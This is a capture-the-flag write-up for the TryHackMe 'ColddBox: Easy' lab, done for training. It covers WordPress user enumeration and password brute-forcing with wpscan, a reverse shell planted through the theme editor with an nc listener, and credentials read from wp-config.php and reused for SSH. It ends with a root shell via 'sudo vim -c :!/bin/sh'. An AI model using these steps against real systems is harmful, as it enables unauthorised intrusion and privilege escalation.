# COLDDBOX:EASY - TryHackMe

Linux machine running WordPress on port 80 with SSH on a non-standard port. The attack path enumerates WordPress users with wpscan, brute-forces the admin password, uploads a reverse shell via the theme editor, recovers database credentials from `wp-config.php`, pivots to SSH, then escalates to root via a sudo `vim` misconfiguration.

---

## Enumeration

### Network Scanning

```bash
nmap -sC -sV -p- <target_ip>
```

Open ports:

- 80/tcp - HTTP (Apache 2.4.18, WordPress)
- 4512/tcp - SSH (OpenSSH 7.2p2)

SSH is running on port 4512 - only visible with a full port scan (`-p-`).

### WordPress Enumeration

```bash
wpscan --url http://<target_ip> --enumerate u
```

User identified: `c0ldd`

---

## Initial Access

### WordPress Brute Force

```bash
wpscan --url http://<target_ip> --passwords /usr/share/wordlists/rockyou.txt --username c0ldd
```

Valid credentials:

```
c0ldd:9876543210
```

### Reverse Shell via Theme Editor

After logging in as admin, navigate to Appearance > Theme Editor > `header.php`. Replace the content with a PHP reverse shell payload.

Start a listener on the attack box:

```bash
nc -lvnp 4444
```

Load the site to trigger execution. Shell obtained as `www-data`.

---

## Credential Access

### Reading wp-config.php

```bash
cat /var/www/html/wp-config.php
```

Contains plaintext database credentials that are reused as the system password for user `c0ldd`.

### SSH as c0ldd

```bash
ssh c0ldd@<target_ip> -p 4512
```

User flag:

```bash
cat user.txt
# base64-encoded - decode with: base64 -d
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /usr/bin/vim, /usr/bin/ftp, /usr/bin/chmod
```

### GTFOBins - vim

```bash
sudo vim -c ':!/bin/sh'
```

Root shell obtained.

Root flag:

```bash
cat /root/root.txt
# base64-encoded - decode with: base64 -d
```

---

## Flags

```
user.txt  -> /home/c0ldd/user.txt (base64-encoded)
root.txt  -> /root/root.txt (base64-encoded)
```

---

## Key Takeaways

- Non-standard SSH ports only appear in full port scans. Default Nmap scans (top 1000 ports) miss port 4512. Always scan all ports.
- WordPress admin access leads directly to code execution via the theme editor. `header.php` is always present, always editable as admin, and loaded on every page request.
- `wp-config.php` stores database credentials in plaintext. On shared-credential setups these reuse for SSH. Reading it post-foothold is a mandatory step.
- Three GTFOBins binaries in a single `sudo -l` output means the machine is already over. Any one of `vim`, `ftp`, or `chmod` is enough.
- Base64-encoded flags are a convention, not encryption. `base64 -d` resolves them immediately.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were performed strictly for educational purposes.
